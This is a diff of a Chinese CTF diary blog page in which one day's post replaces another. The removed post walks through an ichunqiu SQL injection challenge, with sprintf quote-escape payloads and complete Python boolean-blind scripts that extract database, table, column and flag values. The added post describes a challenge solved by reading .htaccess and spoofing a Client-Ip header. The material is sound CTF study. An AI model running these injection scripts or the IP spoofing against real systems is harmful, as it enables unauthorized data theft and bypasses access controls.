@@ -17,7 +17,7 @@
   <meta name="description" content="瞎写糊涂账">
   <meta name="author" content="renex">
   <meta name="keywords" content="">
-  <title>20-09-21 - renex的杂烩集</title>
+  <title>20-09-22 - renex的杂烩集</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-09-21 08:34" pubdate>
-        September 21, 2020 am
+      <time datetime="2020-09-22 09:30" pubdate>
+        September 22, 2020 am
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      712 字
+      618 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      6
        分钟
     </span>
   
@@ -217,183 +217,24 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">20-09-21</h1>
+            <h1 style="display: none">20-09-22</h1>
             
             <div class="markdown-body" id="post-body">
-              <p>象棋（ichuqiu）<br>昨天就做到的题，猫腻在源码里就能找到，js链接是个正则表达式，不过之前一直想着的是用python做，但是只会单线程的我半天没找到答案。<br>今天看wp突然醒悟用bp就挺好的，成功爆破flag</p>
-<hr>
-<p>SQLi(ichunqiu)<br>收获颇多的一道题<br>进入就是登录界面，尝试admin为用户名一次就对，想着直接爆破结果失败了。发现回显只有username error!以及password error!两种，bool盲注<br>先试试过滤点，发现后缀是%时报错时sprintf参数问题，查找关于sprintf的漏洞找到这篇<a href="https://zhuanlan.zhihu.com/p/115777073" target="_blank" rel="noopener">文章</a><br>应该就是单引号逃逸闭合来注入<br>构造payload:  </p>
-<ul>
-<li>admin%1$\’ or 1=1— 回显password error!</li>
-<li>admin%1$\’ or 1=2— 回显username error!<br>可见可以通过or后面表达式的布尔值真假进行bool盲注<pre><code class="hljs go"><span class="hljs-keyword">import</span> requests
-
-<span class="hljs-keyword">import</span> <span class="hljs-keyword">string</span>
-
-url =  <span class="hljs-string">"http://5e2c1c23ad44440f9ba4d92351e69666afb9ede320b748f3.changame.ichunqiu.com/"</span>
-
-dir  = <span class="hljs-keyword">string</span>.digits+<span class="hljs-keyword">string</span>.ascii_letters+  <span class="hljs-string">"!@#$%^&amp;*()_+&#123;&#125;-="</span>
-
-right =  <span class="hljs-string">"password error!"</span>
-
-#猜数据库长度--<span class="hljs-number">-3</span>
-
-<span class="hljs-keyword">for</span> i in <span class="hljs-keyword">range</span>(<span class="hljs-number">30</span>):
-
-	data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">"admin%1$\\' or (length(database())="</span>+str(i)+<span class="hljs-string">")-- "</span>,<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;
-
-	response = requests.post(url,data=data).text
-
-	<span class="hljs-built_in">print</span>(<span class="hljs-string">"..."</span>+str(i))
-
-	<span class="hljs-keyword">if</span> right in response:
-
-		<span class="hljs-built_in">print</span>(<span class="hljs-string">"the length of database_name is"</span>+str(i))
-		<span class="hljs-keyword">break</span></code></pre>
-<pre><code class="hljs routeros"><span class="hljs-comment">#爆数据库---ctf</span>
-
-database_name = <span class="hljs-string">''</span>
-
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,4):
-
-	<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dir:
-
-		payload = <span class="hljs-string">"admin%1$\\' or (ascii(substr(database(),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">")-- "</span>
-
-		data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;
-
-		response = requests.post(url,<span class="hljs-attribute">data</span>=data).text
-
-		<span class="hljs-builtin-name">print</span>(payload.format(i)+<span class="hljs-string">"..."</span>)
-
-		<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
-
-			database_name+=c
-
-			<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"okkkkkkkkkkkkkkkkkkk"</span>+c)
-
-			break
-
-<span class="hljs-builtin-name">print</span>(database_name)</code></pre>
-<pre><code class="hljs sql"><span class="hljs-comment">#爆表长度----4</span>
-<span class="hljs-comment">#试着数据库名写成'ctf'发现不行，ctf写成asciihex编码形式0x637466成功注入</span>
-<span class="hljs-comment">#注意使用limit 0,1限定查询</span>
-
-table_name = ''
-
-for i in range(30):
-
-	payload = "admin%1$\\' or (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-number">0x637466</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"+str(i)+"</span><span class="hljs-comment">-- "</span>
-
-	<span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;
-
-	response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).text
-
-	print(payload+<span class="hljs-string">"..."</span>)
-
-	<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:
-
-		print(<span class="hljs-string">"------------------"</span>+<span class="hljs-keyword">str</span>(i))
-
-		break</code></pre>
-<pre><code class="hljs sql"><span class="hljs-comment">#爆表名----flag</span>
-
-table_name = ''
-
-for i in range(1,5):
-
-	for c in dir:
-
-	payload = "admin%1$\\' or ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>))=<span class="hljs-string">"+str(ord(c))+"</span><span class="hljs-comment">-- "</span>
-
-	<span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">"password"</span>&#125;
-
-	response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).text
-
-	print(payload.format(i)+<span class="hljs-string">"..."</span>)
-
-	<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:
-
-		table_name+=c
-
-		print(<span class="hljs-string">"-------------------"</span>+c)
-
-		break
-
-print(table_name)</code></pre>
-<pre><code class="hljs sql"><span class="hljs-comment">#爆列长度---4</span>
-
-for i in range(30):
-
-	payload = "admin%1$\\' or (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-number">0x666c6167</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">"+str(i)+"</span><span class="hljs-comment">-- "</span>
-
-	<span class="hljs-keyword">data</span> = &#123;<span class="hljs-string">'username'</span>:payload,<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;
-
-	response = requests.post(<span class="hljs-keyword">url</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>).text
-
-	print(payload)
-
-	<span class="hljs-keyword">if</span> <span class="hljs-keyword">right</span> <span class="hljs-keyword">in</span> response:
-
-		print(<span class="hljs-string">"--------------------"</span>+<span class="hljs-keyword">str</span>(i))
-
-		break</code></pre>
-<pre><code class="hljs routeros"><span class="hljs-comment">#爆列名---flag</span>
-
-column_name = <span class="hljs-string">''</span>
-
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1,5):
-
-	<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dir:
-
-		payload = <span class="hljs-string">"admin%1$\\' or ascii(substr((select column_name from information_schema.columns where table_name = 0x666c6167 limit 0,1),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">"-- "</span>
-
-		data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;
-
-		response = requests.post(url,<span class="hljs-attribute">data</span>=data).text
-
-		<span class="hljs-builtin-name">print</span>(payload.format(i))
-
-		<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
-
-			column_name+=c
-
-			<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"------------"</span>+c)
-
-			break
-
-<span class="hljs-builtin-name">print</span>(column_name)</code></pre>
-<pre><code class="hljs routeros"><span class="hljs-comment">#爆flag</span>
-<span class="hljs-comment">#懒得爆长度了，直接上</span>
-
-<span class="hljs-attribute">flag</span>=<span class="hljs-string">''</span>
-
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span>  range(1,100):
-
-		<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span>  dir:
-
-			payload =  <span class="hljs-string">"admin%1$\\' or ascii(substr((select flag from flag limit 0,1),&#123;0&#125;,1))="</span>+str(ord(c))+<span class="hljs-string">"-- "</span>
-
-			data = &#123;<span class="hljs-string">'username'</span>:payload.format(i),<span class="hljs-string">'password'</span>:<span class="hljs-string">'password'</span>&#125;
-
-			response = requests.post(url,<span class="hljs-attribute">data</span>=data).text
-
-			<span class="hljs-builtin-name">print</span>(payload.format(i))
-
-			<span class="hljs-keyword">if</span> right <span class="hljs-keyword">in</span> response:
-
-				flag+=c
-
-				<span class="hljs-builtin-name">print</span>(<span class="hljs-string">"------------"</span>+c)
-
-				break
-
-		<span class="hljs-keyword">if</span> c ==  <span class="hljs-string">'&#125;'</span>:
-
-			break
-
-<span class="hljs-builtin-name">print</span>(flag)</code></pre>
-</li>
-</ul>
+              <p>Not Found(ichunqiu)<br>进去之后就是Not Found，看到404.php，源码没有发现什么，在响应头发现自定义响应头X-Method：haha。<br>先查看404.php，页面也显示haha，尝试对目录爆破搜索，基本全是404，在1.php的时候得到not here,plz trying，还是没什么用。<br>回到index.php，开始对X-Method研究，尝试各种请求头最后在OPTIONS发现响应头出现Location: ?f=1.php，添加到请求后发现1.php的源码。<br>但是尝试读取其他文件以及伪协议全都显示Not allowed file，查看wp发现apache有.htaccess文件：</p>
+<blockquote>
+<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+</blockquote>
+<p>这就解释了大部分页面404被定制以及文件禁止访问的问题<br>访问后得到：</p>
+<pre><code>RewriteEngine On
+RewriteBase /
+RewriteRule ^8d829d8568e46455104209db5cd9228d.html$ 404.php [L]
+</code></pre><p>发现一个页面被重写名成404.php，直接访问这个页面得到：</p>
+<p>ip incorrect ???XFF???<br>看来是需要伪造IP，但是通过XFF伪造发现行不通，改用Client-Ip头进行伪造，得到flag</p>
+<blockquote>
+<p>remote_addr指的是当前直接请求的客户端IP地址，它存在于tcp请求体中，是http协议传输时自动添加的，不受请求头header所控制。所以，当客户端与服务器间不存在任何代理时，通过remote_addr获取客户端IP地址是最准确的，也是最安全的。</p>
+<p>　　x-forwarded-for简称XFF，它其实和http协议本身并没什么关系，是很多代理服务器在请求转发时添加上去的。如果客户端和服务器之间存在代理服务器，那么直接通过remote_addr获取的IP就是代理服务器的地址，并不是客户端真实的IP地址。因此，需要代理服务器（通常是反向代理服务器）将真实客户端的IP地址转发给服务器，转发时客户端的真实IP地址通常就存在于x-forwarded-for请求头中。</p>
+<p>　　client-ip同x-forwarded-for，也是代理服务器添加的用于转发客户端请求的真实IP地址，同样保存于请求头中。</p>
+</blockquote>
 
             </div>
             <hr>
@@ -417,18 +258,12 @@ column_name = <span class="hljs-string">''</span>
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/09/22/20-09-22/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">20-09-22</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/09/20/20-09-20/">
-                        <span class="hidden-mobile">20-09-20</span>
+                      <a href="/2020/09/21/20-09-21/">
+                        <span class="hidden-mobile">20-09-21</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -571,7 +406,7 @@ column_name = <span class="hljs-string">''</span>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "20-09-21&nbsp;",
+        "20-09-22&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
